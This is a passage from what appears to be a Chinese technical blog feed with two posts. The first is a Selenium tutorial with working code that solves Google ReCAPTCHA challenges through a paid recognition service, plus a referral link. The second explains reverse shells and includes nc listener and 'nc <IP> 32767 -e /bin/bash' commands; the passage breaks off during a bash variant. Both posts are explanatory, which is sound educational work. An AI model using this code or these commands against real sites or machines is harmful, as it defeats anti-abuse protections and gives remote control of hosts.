self.browser.switch_to.default_content()</span><br><span class="line">    captcha_content_iframe = self.browser.find_element_by_xpath(</span><br><span class="line">        <span class="string">'//iframe[contains(@title, "recaptcha challenge")]'</span>)</span><br><span class="line">    <span class="keyword">return</span> captcha_content_iframe</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_to_captcha_content_iframe</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    captcha_content_iframe: WebElement = self.get_captcha_content_iframe()</span><br><span class="line">    self.browser.switch_to.frame(captcha_content_iframe)</span><br></pre>      </td>    </tr>  </table></figure><p>这样的话，我们只需要调用 switch_to_captcha_content_iframe 就能查找验证码图片里面的内容，调用 switch_to_captcha_entry_iframe 就能查找验证码入口里面的内容。</p><h3 id="触发验证码"><a href="#触发验证码" class="headerlink" title="触发验证码"></a>触发验证码</h3><p>OK，那么接下来的一步就是来模拟点击验证码的入口，然后把验证码触发出来了对吧，就是模拟点击这里：</p><p><img src="https://qiniu.cuiqingcai.com/6ro9y.png" alt=""></p><p>实现很简单，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_captcha</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    self.switch_to_captcha_entry_iframe()</span><br><span class="line">    captcha_entry = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.ID, <span class="string">'recaptcha-anchor'</span>)))</span><br><span class="line">    captcha_entry.click()</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    self.switch_to_captcha_content_iframe()</span><br><span class="line">    entire_captcha_element: WebElement = self.get_entire_captcha_element()</span><br><span class="line">    <span class="keyword">if</span> entire_captcha_element.is_displayed:</span><br><span class="line">        logger.debug(<span class="string">'trigged captcha successfully'</span>)</span><br></pre>      </td>    </tr>  </table></figure><p>这里首先我们首先调用 switch_to_captcha_entry_iframe 进行了 iframe 的切换，然后找到那个入口框对应的节点，然后点击一下。</p><p>点击完了之后我们再调用 switch_to_captcha_content_iframe 切换到验证码本身对应的 iframe 里面，查找验证码本身对应的节点是否加载出来了，如果加载出来了，那么就证明触发成功了。</p><h3 id="找出识别目标"><a href="#找出识别目标" class="headerlink" title="找出识别目标"></a>找出识别目标</h3><p>OK，那么现在验证码可能就长这样子了：</p><p><img src="https://qiniu.cuiqingcai.com/6igpt.png" alt=""></p><p>那接下来我们要做的就是两件事了，一件事就是把匹配目标找出来，就是上图中的加粗字体，第二件事就是把验证码进行保存，然后转成 Base64 编码，提交给 CaptchaResolver 来识别。</p><p>好，那么怎么查找匹配目标呢？也就是上图中的 traffice lights，用 Selenium 常规的节点搜索就好了：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_target_name</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    captcha_target_name_element: WebElement = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'.rc-imageselect-desc-wrapper strong'</span>)))</span><br><span class="line">    <span class="keyword">return</span> captcha_target_name_element.text</span><br></pre>      </td>    </tr>  </table></figure><p>通过调用这个方法，我们就能得到上图中类似 traffic lights 的内容了。</p><h3 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h3><p>接着，我们对验证码图片进行下载，然后转 Base64 进行识别吧，整体代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_entire_captcha</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.entire_captcha_natural_width = self.get_entire_captcha_natural_width()</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'entire_captcha_natural_width <span class="subst">&#123;self.entire_captcha_natural_width&#125;</span>'</span></span><br><span class="line">    )</span><br><span class="line">    self.captcha_target_name = self.get_captcha_target_name()</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'captcha_target_name <span class="subst">&#123;self.captcha_target_name&#125;</span>'</span></span><br><span class="line">    )</span><br><span class="line">    entire_captcha_element: WebElement = self.get_entire_captcha_element()</span><br><span class="line">    entire_captcha_url = entire_captcha_element.find_element_by_css_selector(</span><br><span class="line">        <span class="string">'td img'</span>).get_attribute(<span class="string">'src'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'entire_captcha_url <span class="subst">&#123;entire_captcha_url&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(CAPTCHA_ENTIRE_IMAGE_FILE_PATH, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(requests.get(entire_captcha_url).content)</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'saved entire captcha to <span class="subst">&#123;CAPTCHA_ENTIRE_IMAGE_FILE_PATH&#125;</span>'</span>)</span><br><span class="line">    resized_entire_captcha_base64_string = resize_base64_image(</span><br><span class="line">        CAPTCHA_ENTIRE_IMAGE_FILE_PATH, (self.entire_captcha_natural_width,</span><br><span class="line">                                         self.entire_captcha_natural_width))</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'resized_entire_captcha_base64_string, <span class="subst">&#123;resized_entire_captcha_base64_string[<span class="number">0</span>:<span class="number">100</span>]&#125;</span>...'</span>)</span><br><span class="line">    entire_captcha_recognize_result = self.captcha_resolver.create_task(</span><br><span class="line">        resized_entire_captcha_base64_string,</span><br><span class="line">        get_question_id_by_target_name(self.captcha_target_name)</span><br><span class="line">    )</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们首先获取了一些验证码的基本信息：</p><ul>  <li>entire_captcha_natural_width：验证码图片对应的图片真实大小，这里如果是 3x3 的验证码图片，那么图片的真实大小就是 300，如果是 4x4 的验证码图片，那么图片的真实大小是 450</li>  <li>captcha_target_name：识别目标名称，就是刚才获取到的内容</li>  <li>entire_captcha_element：验证码图片对应的节点对象。</li></ul><p>这里我们先把 entire_captcha_element 里面的 img 节点拿到，然后将 img 的 src 内容获取下来，赋值为 entire_captcha_url，这样其实就得到了一张完整的验证码大图，然后我们将其写入到文件中。</p><p>结果就类似这样的：</p><p><img src="https://qiniu.cuiqingcai.com/0hjjh.png" alt=""></p><p>接着我们把这个图片发给 YesCaptcha 进行识别就好了。</p><h3 id="Base64-编码"><a href="#Base64-编码" class="headerlink" title="Base64 编码"></a>Base64 编码</h3><p>接着，我们把这张图片转下 Base64 编码，定义这样一个方法：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resize_base64_image</span><span class="params">(filename, size)</span>:</span></span><br><span class="line">    width, height = size</span><br><span class="line">    img = Image.open(filename)</span><br><span class="line">    new_img = img.resize((width, height))</span><br><span class="line">    new_img.save(CAPTCHA_RESIZED_IMAGE_FILE_PATH)</span><br><span class="line">    <span class="keyword">with</span> open(CAPTCHA_RESIZED_IMAGE_FILE_PATH, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        encoded_string = base64.b64encode(data)</span><br><span class="line">        <span class="keyword">return</span> encoded_string.decode(<span class="string">'utf-8'</span>)</span><br></pre>      </td>    </tr>  </table></figure><p>这里值得注意的是，由于 API 对图片大小有限制，如果是 3x3 的图片，那么我们需要将图片调整成 300x300 才可以，如果是 4x4 的图片，那么我们需要将图片调整成 450x450，所以这里我们先调用了 Image 的 resize 方法调整了大小，接着再转成了 Base64 编码。</p><h3 id="问题-ID-处理"><a href="#问题-ID-处理" class="headerlink" title="问题 ID 处理"></a>问题 ID 处理</h3><p>那问题 ID 怎么处理呢？通过 API 文档 <span class="exturl" data-url="aHR0cHM6Ly95ZXNjYXB0Y2hhLmF0bGFzc2lhbi5uZXQvd2lraS9zcGFjZXMvWUVTQ0FQVENIQS9wYWdlcy8xODA1NTE2OQ==">https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/18055169<i class="fa fa-external-link-alt"></i></span> 我们可以看到如下映射表：</p><p><img src="https://qiniu.cuiqingcai.com/qfyjb.png" alt=""></p><p>所以，比如假如验证码里面我们得到的是 traffic lights，那么问题 ID 就是 <code>/m/015qff</code>，行，那我们反向查找就好了，定义这么个方法：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>      </td>      <td class="code">        <pre><span class="line">CAPTCHA_TARGET_NAME_QUESTION_ID_MAPPING = &#123;</span><br><span class="line">    <span class="string">"taxis"</span>: <span class="string">"/m/0pg52"</span>,</span><br><span class="line">    <span class="string">"bus"</span>: <span class="string">"/m/01bjv"</span>,</span><br><span class="line">    <span class="string">"school bus"</span>: <span class="string">"/m/02yvhj"</span>,</span><br><span class="line">    <span class="string">"motorcycles"</span>: <span class="string">"/m/04_sv"</span>,</span><br><span class="line">    <span class="string">"tractors"</span>: <span class="string">"/m/013xlm"</span>,</span><br><span class="line">    <span class="string">"chimneys"</span>: <span class="string">"/m/01jk_4"</span>,</span><br><span class="line">    <span class="string">"crosswalks"</span>: <span class="string">"/m/014xcs"</span>,</span><br><span class="line">    <span class="string">"traffic lights"</span>: <span class="string">"/m/015qff"</span>,</span><br><span class="line">    <span class="string">"bicycles"</span>: <span class="string">"/m/0199g"</span>,</span><br><span class="line">    <span class="string">"parking meters"</span>: <span class="string">"/m/015qbp"</span>,</span><br><span class="line">    <span class="string">"cars"</span>: <span class="string">"/m/0k4j"</span>,</span><br><span class="line">    <span class="string">"vehicles"</span>: <span class="string">"/m/0k4j"</span>,</span><br><span class="line">    <span class="string">"bridges"</span>: <span class="string">"/m/015kr"</span>,</span><br><span class="line">    <span class="string">"boats"</span>: <span class="string">"/m/019jd"</span>,</span><br><span class="line">    <span class="string">"palm trees"</span>: <span class="string">"/m/0cdl1"</span>,</span><br><span class="line">    <span class="string">"mountains or hills"</span>: <span class="string">"/m/09d_r"</span>,</span><br><span class="line">    <span class="string">"fire hydrant"</span>: <span class="string">"/m/01pns0"</span>,</span><br><span class="line">    <span class="string">"fire hydrants"</span>: <span class="string">"/m/01pns0"</span>,</span><br><span class="line">    <span class="string">"a fire hydrant"</span>: <span class="string">"/m/01pns0"</span>,</span><br><span class="line">    <span class="string">"stairs"</span>: <span class="string">"/m/01lynh"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_question_id_by_target_name</span><span class="params">(target_name)</span>:</span></span><br><span class="line">    logger.debug(<span class="string">f'try to get question id by <span class="subst">&#123;target_name&#125;</span>'</span>)</span><br><span class="line">    question_id = CAPTCHA_TARGET_NAME_QUESTION_ID_MAPPING.get(target_name)</span><br><span class="line">    logger.debug(<span class="string">f'question_id <span class="subst">&#123;question_id&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> question_id</span><br></pre>      </td>    </tr>  </table></figure><p>这样传入名称，我们就可以得到问题 ID 了。</p><p>最后将上面的参数直接调用 CaptchaResovler 对象的 create_task 方法就能得到识别结果了。</p><h3 id="模拟点击"><a href="#模拟点击" class="headerlink" title="模拟点击"></a>模拟点击</h3><p>得到结果之后，我们知道返回结果的 objects 就是需要点击的验证码格子的列表，下面进行模拟点击即可：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">single_captcha_elements = self.wait.until(EC.visibility_of_all_elements_located(</span><br><span class="line">          (By.CSS_SELECTOR, <span class="string">'#rc-imageselect-target table td'</span>)))</span><br><span class="line"><span class="keyword">for</span> recognized_index <span class="keyword">in</span> recognized_indices:</span><br><span class="line">    single_captcha_element: WebElement = single_captcha_elements[recognized_index]</span><br><span class="line">    single_captcha_element.click()</span><br><span class="line">    <span class="comment"># check if need verify single captcha</span></span><br><span class="line">    self.verify_single_captcha(recognized_index)</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们首先得到了 recognized_indices 就是识别结果对应的标号，然后逐个遍历进行模拟点击。</p><p>对于每次点击，我们可以直接获取所有的验证码格子对应的节点，然后调用其 click 方法就可以完成点击了，其中格子的标号和返回结果的对应关系如图：</p><p><img src="https://qiniu.cuiqingcai.com/1z01j.png" alt=""></p><blockquote>  <p>当然我们也可以通过执行 JavaScript 来对每个节点进行模拟点击，效果是类似的。</p></blockquote><p>这样我们就可以实现验证码小图的逐个识别了。</p><h3 id="小图识别"><a href="#小图识别" class="headerlink" title="小图识别"></a>小图识别</h3><p>等等，在识别过程中还发现了一个坑，那就是有时候我们点击完一个小格子之后，这个小格子就消失了！然后在原来的小格子的位置出现了一个新的小图，我们需要对新出现的图片进行二次识别才可以。</p><p>这个怎么处理呢？</p><p>我们其实可以在每点击完一个格子之后就来校验下当前小格子有没有图片刷新，如果有图片刷新，那么对应的 HTML 的 class 就会变化，否则就会包含 selected 字样，然后我们再继续对小格子对应的图进行二次识别就好了。</p><p>这里我们再定义一个方法：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_single_captcha</span><span class="params">(self, index)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    elements = self.wait.until(EC.visibility_of_all_elements_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'#rc-imageselect-target table td'</span>)))</span><br><span class="line">    single_captcha_element: WebElement = elements[index]</span><br><span class="line">    class_name = single_captcha_element.get_attribute(<span class="string">'class'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'verifiying single captcha <span class="subst">&#123;index&#125;</span>, class <span class="subst">&#123;class_name&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'selected'</span> <span class="keyword">in</span> class_name:</span><br><span class="line">        logger.debug(<span class="string">f'no new single captcha displayed'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    logger.debug(<span class="string">'new single captcha displayed'</span>)</span><br><span class="line">    single_captcha_url = single_captcha_element.find_element_by_css_selector(</span><br><span class="line">            <span class="string">'img'</span>).get_attribute(<span class="string">'src'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'single_captcha_url <span class="subst">&#123;single_captcha_url&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(CAPTCHA_SINGLE_IMAGE_FILE_PATH, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(requests.get(single_captcha_url).content)</span><br><span class="line">    resized_single_captcha_base64_string = resize_base64_image(</span><br><span class="line">        CAPTCHA_SINGLE_IMAGE_FILE_PATH, (<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line">    single_captcha_recognize_result = self.captcha_resolver.create_task(</span><br><span class="line">        resized_single_captcha_base64_string, get_question_id_by_target_name(self.captcha_target_name))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> single_captcha_recognize_result:</span><br><span class="line">        logger.error(<span class="string">'count not get single captcha recognize result'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    has_object = single_captcha_recognize_result.get(</span><br><span class="line">        <span class="string">'solution'</span>, &#123;&#125;).get(<span class="string">'hasObject'</span>)</span><br><span class="line">    <span class="keyword">if</span> has_object <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        logger.error(<span class="string">'count not get captcha recognized indices'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> has_object <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        logger.debug(<span class="string">'no more object in this single captcha'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> has_object:</span><br><span class="line">        single_captcha_element.click()</span><br><span class="line">        <span class="comment"># check for new single captcha</span></span><br><span class="line">        self.verify_single_captcha(index)</span><br></pre>      </td>    </tr>  </table></figure><p>OK，这里我们定义了一个 verify_single_captcha 方法，然后传入了格子对应的序号。接着我们首先尝试查找格子对应的节点，然后找出对应的 HTML 的 class 属性。如果没有出现新的小图，那就是这样的选中状态，对应的 class 就包含了 selected 字样，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/aec6b.png" alt=""></p><p>对于这样的图片，我们就不需要进行二次验证，否则就需要对这个格子进行截图和二次识别。</p><p>二次识别的步骤也是一样的，我们需要将小格子对应的图片单独获取其 url，然后下载下来，接着调整大小并转化成 Base64 编码，然后发给 API，API 会通过一个 hasObject 字段告诉我们这个小图里面是否包含我们想要识别的目标内容，如果是，那就接着点击，然后递归进行下一次检查，如果不是，那就跳过。</p><h3 id="点击验证"><a href="#点击验证" class="headerlink" title="点击验证"></a>点击验证</h3><p>好，那么有了上面的逻辑，我们就能完成整个 ReCAPTCHA 的识别和点选了。</p><p>最后，我们模拟点击验证按钮就好了：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_verify_button</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    verify_button = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'#recaptcha-verify-button'</span>)))</span><br><span class="line">    <span class="keyword">return</span> verify_button</span><br><span class="line">        </span><br><span class="line"><span class="comment"># after all captcha clicked</span></span><br><span class="line">verify_button: WebElement = self.get_verify_button()</span><br><span class="line"><span class="keyword">if</span> verify_button.is_displayed:</span><br><span class="line">    verify_button.click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre>      </td>    </tr>  </table></figure><h3 id="校验结果"><a href="#校验结果" class="headerlink" title="校验结果"></a>校验结果</h3><p>点击完了之后，我们可以尝试检查网页变化，看看有没有验证成功。</p><p>比如验证成功的标志就是出现一个绿色小对勾：</p><p><img src="https://qiniu.cuiqingcai.com/y8jvw.png" alt=""></p><p>检查方法如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_is_successful</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.switch_to_captcha_entry_iframe()</span><br><span class="line">    anchor: WebElement = self.wait.until(EC.visibility_of_element_located((</span><br><span class="line">        By.ID, <span class="string">'recaptcha-anchor'</span></span><br><span class="line">    )))</span><br><span class="line">    checked = anchor.get_attribute(<span class="string">'aria-checked'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'checked <span class="subst">&#123;checked&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> str(checked) == <span class="string">'true'</span></span><br></pre>      </td>    </tr>  </table></figure><p>这里我们先切换了 iframe，然后检查了对应的 class 是否是符合期望的。</p><p>最后如果 get_is_successful 返回结果是 True，那就代表识别成功了，那就整个完成了。</p><p>如果返回结果是 False，我们可以进一步递归调用上述逻辑进行二次识别，直到识别成功即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>以上代码可能比较复杂，这里我将代码进行了规整，然后放到 GitHub 上了，大家如有需要可以自取：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvUmVjYXB0Y2hhUmVzb2x2ZXI=">https://github.com/Python3WebSpider/RecaptchaResolver<i class="fa fa-external-link-alt"></i></span></p><h2 id="注册地址"><a href="#注册地址" class="headerlink" title="注册地址"></a>注册地址</h2><p>最后需要说明一点，上面的验证码服务是收费的，每验证一次可能花一定的点数，比如识别一次 3x3 的图要花 10 点数，而充值一块钱就能获得 1000 点数，所以识别一次就一分钱，还是比较便宜的。</p><p>我这里充值了好几万点数，然后我就变成了 VIP5级的账号。我研究了下发现大家如果用我的邀请链接 <span class="exturl" data-url="aHR0cHM6Ly95ZXNjYXB0Y2hhLmNvbS9pL0NuWlBCdQ==">https://yescaptcha.com/i/CnZPBu<i class="fa fa-external-link-alt"></i></span> 注册大家可以直接变成 VIP4，然后 VIP4可以获取首充赠送 10% 的优惠，还不错哈～</p><p>希望本文对大家有帮助。</p><p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;大家好，我是崔庆才。&lt;/p&gt;
&lt;p&gt;之前的时候我分享过 ReCAPTCHA 的破解方案，那种方案是获取到 ReCAPTCHA 其中的一个 siteKey，然后将 siteKey 直接提交给 ReCAPTCHA 相关的破解服务来实现破解。&lt;/p&gt;
&lt;p&gt;这次，我们再来介绍一种
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="验证码" scheme="https://cuiqingcai.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="ReCAPTCHA" scheme="https://cuiqingcai.com/tags/ReCAPTCHA/"/>
    
  </entry>
  
  <entry>
    <title>什么是反弹 Shell？</title>
    <link href="https://cuiqingcai.com/36056.html"/>
    <id>https://cuiqingcai.com/36056.html</id>
    <published>2022-04-17T02:00:22.000Z</published>
    <updated>2022-08-01T15:41:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间被一位产品经理嘲笑了，说我居然连反弹 Shell 都不知道！</p><p>说实话当时我还真不知道，但这口气咽不下去啊，得赶紧学来看看，这不，我已经学会了！</p><p>学完之后我特地来记录下，同时分享给大家，以后产品经理再也不敢嘲笑我们不懂反弹 Shell 了！</p><h2 id="什么是反弹-Shell"><a href="#什么是反弹-Shell" class="headerlink" title="什么是反弹 Shell"></a>什么是反弹 Shell</h2><p>我们都知道 Shell 的概念吧，简单来说，Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。</p><p>那反弹 Shell 是啥呢？其英文名叫做 Reverse Shell，具体干什么的呢？就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。</p><p>比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B了。</p><h2 id="反弹-Shell-有什么用？"><a href="#反弹-Shell-有什么用？" class="headerlink" title="反弹 Shell 有什么用？"></a>反弹 Shell 有什么用？</h2><p>还是原来的例子，我们想用 A 来控制 B，如果想用 ssh 等命令来控制，那得输入 B 的 sshd 地址或者端口对吧？但是在很多情况下，由于防火墙、安全组、局域网、NAT 等原因，我们实际上是无法直接连接到 B 的，比如：</p><ul>  <li>    <p>A 虽然有公网 IP，但 B 是一个处于内网的机器，A 就没法直接连到 B 上。</p>  </li>  <li>    <p>B 上开了防火墙或者安全组限制，sshd 的服务端口 22 被封闭了。</p>  </li>  <li>    <p>B 是一台拨号主机，其 IP 地址经常变动。</p>  </li>  <li>    <p>假如 B 被攻击了，我们想让 B 向 A 汇报自己的状况，那自然就需要 B 主动去连接 A。</p>  </li></ul><p>如果是这些情况，我们就可以用反弹 Shell 用 A 来控制 B 了。</p><h2 id="反弹-Shell-案例"><a href="#反弹-Shell-案例" class="headerlink" title="反弹 Shell 案例"></a>反弹 Shell 案例</h2><p>首先我们先看一个标准的反弹 Shell 的例子，这里我们一共需要两台主机：</p><ul>  <li>    <p>A 是控制端，可以处于公网之中，也可以和 B 处于一个局域网中，总之能让 B 找到 A 就行。</p>  </li>  <li>    <p>&#x20;B 是被控端，可以处在局域网之中。</p>  </li></ul><p>在开始之前我们需要用到 nc 命令，安装非常简单。</p><p>如果是 CentOS 系列系统，安装命令如下：</p><figure class="highlight powershell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">yum install <span class="literal">-y</span> nc <span class="comment"># CentOS</span></span><br></pre>      </td>    </tr>  </table></figure><p>如果是 Ubuntu 系列系统，安装命令可以参考 <span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTAwNjU5OTMvaG93LXRvLXN3aXRjaC10by1uZXRjYXQtdHJhZGl0aW9uYWwtaW4tdWJ1bnR1">https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu<i class="fa fa-external-link-alt"></i></span>。</p><p>接着，我们在 A 上执行如下命令：</p><figure class="highlight powershell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">nc <span class="literal">-lvp</span> <span class="number">32767</span></span><br></pre>      </td>    </tr>  </table></figure><p>这个命令的意思是开启 32767 的端口监听，运行之后如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/pa0wf.png" alt=""></p><p>这样就表明 A 上正在监听 32767 端口的连接了。</p><p>这时候，我们可以在 B 上通过类似的命令连接到 A，假如 A 的 IP 是 111.112.113.114，那么命令如下：</p><figure class="highlight powershell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">nc <span class="number">111.112</span>.<span class="number">113.114</span> <span class="number">32767</span> <span class="literal">-e</span> /bin/bash</span><br></pre>      </td>    </tr>  </table></figure><blockquote>  <p>注意：你在运行的时候需要替换成 A 的真实 IP 和端口。</p></blockquote><p>运行完毕之后，我们反过来观察下 A，就显示了来自某个 IP 和端口的连接，我们就可以输入命令来控制 B 了，比如这里我们输入了：</p><figure class="highlight powershell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">uname <span class="literal">-a</span></span><br></pre>      </td>    </tr>  </table></figure><p>然后就可以得到 B 的主机名了。</p><p>如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/l155o.png" alt=""></p><p>这样我们就通过 nc 包实现了反弹 Shell。</p><p>有人说，这 B 上一定需要安装 nc 这个包吗？其实不一定的，我们可以直接使用 bash 来实现反弹 Shell，命令如下：</p><figure class="highlight powershell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">bash <span 